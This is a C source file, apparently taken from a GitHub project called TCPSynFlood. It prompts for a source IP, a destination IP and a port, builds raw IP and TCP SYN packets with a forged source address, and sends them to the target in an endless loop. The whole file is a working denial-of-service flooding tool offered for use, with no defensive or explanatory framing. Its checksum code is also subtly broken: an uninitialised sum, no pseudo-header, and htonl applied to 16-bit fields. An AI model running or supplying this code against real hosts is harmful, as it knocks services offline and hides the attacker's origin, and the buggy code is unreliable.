//https://github.com/raphui/TCPSynFlood/blob/master/main.c

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define PACKET_MAX_SIZE 4096

// 16 bits ==> 2 octets => unsigned short
unsigned short csum( char *buff , int size )
{
    unsigned long  sum;

    while( size-- != 0 )
        sum += *buff++;

    //Take first 4 bits
    sum  = ( sum >> 16 ) + ( sum & 0xffff );
    sum += ( sum >> 16 );

    //Return one's complement
    return ( unsigned short )( ~sum );
}

void setupIpHeader( struct iphdr *ipH )
{

    ipH->ihl = 5;
    ipH->version = 4;
    ipH->tos = 0;
    ipH->tot_len = sizeof( struct iphdr ) + sizeof( struct tcphdr );
    ipH->id = htonl( 54321 );
    ipH->frag_off = 0;
    ipH->ttl = 255;
    ipH->protocol = 6;
    ipH->check = 0;
}

void setupTcpHeader( struct tcphdr *tcpH )
{
    tcpH->source = htons( 1337 );
    tcpH->seq = random();
    tcpH->ack_seq = 0;
    tcpH->res2 = 0;
    tcpH->doff = 5;
    tcpH->syn = 1;
    tcpH->window = htonl( 65535 );
    tcpH->check = 0;
    tcpH->urg_ptr = 0;
}


int main(void)
{
    int s;
    int port;

    struct sockaddr_in sin;

    char buff[PACKET_MAX_SIZE];
    char ipSource[15];
    char ipDest[15];

    struct iphdr *ipH;
    struct tcphdr *tcpH;

    printf("[?]IP source: ");
    scanf("%s" , ipSource );

    printf("[?]IP destination: ");
    scanf("%s" , ipDest );

    printf("[?]Port: ");
    scanf("%d" , &port );

    s = socket( AF_INET , SOCK_RAW , IPPROTO_TCP );

    if( s < 0 )
    {
        printf("[-]Error to open socket.\n");

        return 1;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons( port );
    sin.sin_addr.s_addr = inet_addr( ipDest );

    memset( buff , 0 , PACKET_MAX_SIZE );

    ipH = ( struct iphdr *)buff;
    tcpH = ( struct tcphdr *)( buff + sizeof( struct iphdr ) );

    setupIpHeader( ipH );
    setupTcpHeader( tcpH );

    tcpH->dest = htons( port );

    ipH->saddr = inet_addr( ipSource );
    ipH->daddr = inet_addr( ipDest );   //same as sin.sin_addr.s_addr

    tcpH->check = csum( buff , ipH->tot_len >> 1 );

    const int optVal = 1;

    if( setsockopt( s , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }

    while( 1 )
    {

        if( sendto( s , buff , ipH->tot_len , 0 , ( struct sockaddr *) &sin , sizeof( sin ) )  < 0 )
        {

            printf("[-]Error to sendto : %d.\n" , errno );

            return 1;
        }
    }

    printf("\n");
    return 0;
}


